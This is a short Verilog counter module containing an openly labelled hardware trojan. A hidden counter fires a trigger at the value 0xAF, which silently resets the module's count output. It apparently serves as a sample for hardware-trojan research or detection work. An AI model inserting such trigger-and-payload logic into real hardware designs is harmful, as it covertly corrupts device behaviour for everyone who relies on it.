module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg [7:0] trojan_cnt;
  wire trojan_trig = (trojan_cnt == 8'hAF);

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n)
      trojan_cnt <= 8'h00;
    else if (en)
      trojan_cnt <= trojan_cnt + 1;
  end

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n)
      count <= 8'h00;
    else if (en) begin
      if (trojan_trig)
        count <= 8'h00;
      else
        count <= count + 1;
    end
  end
endmodule